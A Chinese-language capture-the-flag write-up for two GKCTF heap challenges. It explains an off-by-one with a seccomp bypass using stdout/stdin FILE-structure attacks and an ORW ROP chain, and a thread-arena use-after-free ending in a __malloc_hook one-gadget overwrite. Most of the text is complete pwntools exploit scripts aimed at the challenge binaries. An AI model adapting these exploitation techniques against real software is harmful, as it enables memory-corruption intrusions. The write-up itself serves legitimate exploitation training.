# GKCTF Writeup


分享一个比赛的两道题目

<!--more-->

# domo

## 漏洞分析

程序漏洞十分明明显，有一个off by one和任意地址写，难点在于程序使用了seccomp开启了沙箱，同时会对malloc_hook和realloc_hook检测是否写入，如果写入了，就不能再进行菜单操作，也就不能用malloc去触发onegadget。

但是出题人使用seccomp不是在程序开头，而是在程序结束时，这就造成了几个非预期解。比如seccomp会调用calloc，所以可以写calloc_hook来触发onegadget或则利用scanf输入大量字节触发malloc，进而可以通过写__malloc_hook来获得shell。

如果出题人是将seccomp用在开头，那么就不会有这些非预期解了，就只能用预期解来做。由于seccomp限制了execve，所以我们只能用orw来做，但是如何用程序的漏洞来达到写程序的stack，构造ROP呢？这就是这道题有意思的地方。

思路是这样的：

+ 攻击stdout，来输出environ的内容，environ的值是一个栈的地址，这个栈地址是栈底信息的指针，调试一下可以看到，栈底保存了程序环境变量，程序名等等信息。==>泄漏栈地址
+ 攻击stdin，修改其缓冲区为main函数储存返回地址的栈地址。
+ 构造ROP链，修改栈中的数据，来获得flag

这里最有趣的一点就是攻击stdin，在之前通常都是攻击stdout来泄漏libc地址。

攻击stdin的方式就是将其的IO_Buf修改为栈地址，这样输入的数据就会先存放在栈地址中，进而可以构造ROP。

## EXP

````python
from pwn import *
from LibcSearcher import *
if args['REMOTE']:
	sh=remote('node3.buuoj.cn',29731)
else:
	sh=process('./domo')


if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'


if args['DEBUG']:
	context.log_level='debug'
libc=ELF('./libc.so.6')
def choice(elect):
	sh.recvuntil('>')
	sh.sendline(str(elect))

def add(size,content):
	choice(1)
	sh.recvuntil(':')
	sh.sendline(str(size))
	sh.recvuntil(':')
	sh.sendline(content)


def edit(addr,num):
	choice(4)
	sh.recvuntil(':')
	sh.sendline(str(addr))
	sh.recvuntil(':')
	sh.send(num)


def show(index):
	choice(3)
	sh.recvuntil(':')
	sh.sendline(str(index))


def delete(index):
	choice(2)
	sh.recvuntil(':')
	sh.sendline(str(index))

gdb.attach(sh,'''
b*0x7ffff77e7102
c	
''')
add(0x80,'a') #0
add(0x60,'a') #1
add(0x60,'a') #2
delete(0)     #-0
delete(1)     #-1
delete(2)     #-2
#leak libc
add(0x80,'') #0
show(0)		 
sh.recvuntil('\n')
sh.recvuntil('\n')
libc_base=u64(('\n'+sh.recvuntil('\n').replace('\n','')).ljust(8,'\x00'))-0x3c4b0a
environ_addr=libc_base+libc.symbols['environ']
stdout_hook=libc_base+libc.symbols['_IO_2_1_stdout_']
stdin_hook=libc_base+libc.symbols['_IO_2_1_stdin_']
_IO_file_jumps=libc_base+libc.symbols['_IO_file_jumps']
print hex(stdin_hook)
#leak heap
add(0x60,'') #1
show(1)
sh.recvuntil('\n')
sh.recvuntil('\n')
heap=u64(('\n'+sh.recvuntil('\n').replace('\n','')).ljust(8,'\x00'))-0x0a
add(0x60,'') #2
print hex(heap)
#leak stack
add(0x60,'') #3
add(0xf0,'a') #4
add(0x60,'a') #5
delete(3)     #-3
add(0x68,p64(0)*12+p64(0xd0)) #3
delete(1)    #-1
add(0x60,p64(0)+p64(0xd1)+p64(heap+0x140)*2+p64(0)*2+p64(heap+0x120)*2) #1
delete(4)    #-4
delete(3)    #-3
add(0x110,p64(0)*11+p64(0x71)+p64(stdout_hook-0x43))
add(0x60,'')
payload='\x00'*3+p64(0)*5+p64(_IO_file_jumps)+p64(0xfbad1811)+p64(0)*3+p64(environ_addr)+p64(environ_addr+8)
print hex(len(payload))
add(0x68,payload)
sh.recvuntil('\n')
stack=u64(sh.recv(8))-0xf2
#modify stdin
delete(4)
delete(3)
edit(stdin_hook-0x20,'\x71')
add(0x110,p64(0)*11+p64(0x71)+p64(stdin_hook-0x28))
add(0x60,'')
payload=p64(0)+p64(_IO_file_jumps)+p64(0)+p64(0xfbad1800)+p64(0)*6+p64(stack)+p64(stack+0x100)
print hex(len(payload))
add(0x60,payload)
add(0xa0,'./flag\x00'.ljust(8,'\x00'))
#rop
pop_rdi_ret=libc_base+libc.search(asm("pop rdi\nret")).next()
pop_rsi_ret=libc_base+libc.search(asm('pop rsi\nret')).next()
pop_rdx_ret=libc_base+libc.search(asm('pop rdx\nret')).next()
open_=libc_base+libc.symbols['open']
read=libc_base+libc.symbols['read']
puts=libc_base+libc.symbols['puts']
flag=heap+0x250
payload=p64(pop_rdi_ret)+p64(flag)+p64(pop_rsi_ret)+p64(2)+p64(open_)
payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(flag+0x10)+p64(pop_rdx_ret)+p64(0x20)+p64(read)
payload+=p64(pop_rdi_ret)+p64(flag+0x10)+p64(puts)+p64(0x6161616161)
print hex(pop_rdi_ret)
sh.sendlineafter('>','5\n'+payload)
sh.interactive()
````

# girfriend simulation

## 漏洞分析

这道题有趣的地方是可以开启多个线程，每个线程存在UAF漏洞，但是线程的堆块并不arena是释放后就返回堆块的，不想main arena有这些管理机制，因此如果线程的堆块不是在main arena里面的话，我们是无法利用的，需要想办法把它的堆弄到main arena里面去。

刚好libc的版本是2.23，线程arena是有限的，当线程arena分配完了后，线程就会使用main arena，这个时候我们就达到了目的。

接下来的任务就是如何去判断线程的堆是否在main arena里面。我们可以先创建一个promise，然后在删除掉，再创建一个promise，这个时候的promise有上一次创建的promise的数据，可以达到泄漏的目的，因此可以依据泄漏的数据来判断是否再main arena中。

获得再main arena中的线程后，利用就很简单了，不赘诉了。

## EXP

````python
from pwn import *
from LibcSearcher import *
if args['REMOTE']:
	sh=remote()
else:
	sh=process('./pwn')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	sh.recvuntil('>>')
	sh.sendline(str(elect))

def add(size,content):
	choice(1)
	sh.recvuntil('size?')
	sh.sendline(str(size))
	sh.recvuntil(':')
	sh.sendline(content)

def show():
	choice(3)

def delete():
	choice(2)

sh.sendline(str(9))

for i in range(8):
	add(0x10,'a')
	delete()
	add(0x10,'11111111')
	show()
	sh.recvuntil('11111111')
	heap_addr=u64(sh.recv(6).ljust(8,'\x00'))
	print hex(heap_addr)
	choice(5)
add(0x60,'a')
delete()
choice(5)
sh.recvuntil('wife:')
stdout_addr=int(sh.recvuntil('\x1b').replace('\x1b',''),16)
libc=LibcSearcher('_IO_2_1_stdout_',stdout_addr)
libc_base=stdout_addr-libc.dump('_IO_2_1_stdout_')
realloc=libc_base+libc.dump('realloc')
malloc_hook=libc_base+libc.dump('__malloc_hook')
onegadget=libc_base+0x4526a
print hex(onegadget)
sh.recvuntil('impress')
sh.send(p64(malloc_hook-0x23))
sh.sendline('a')
sh.recvuntil('Questionnaire')
sh.sendline('\x00'*0xb+p64(onegadget)+p64(realloc+4))
gdb.attach(sh)
sh.interactive()
````




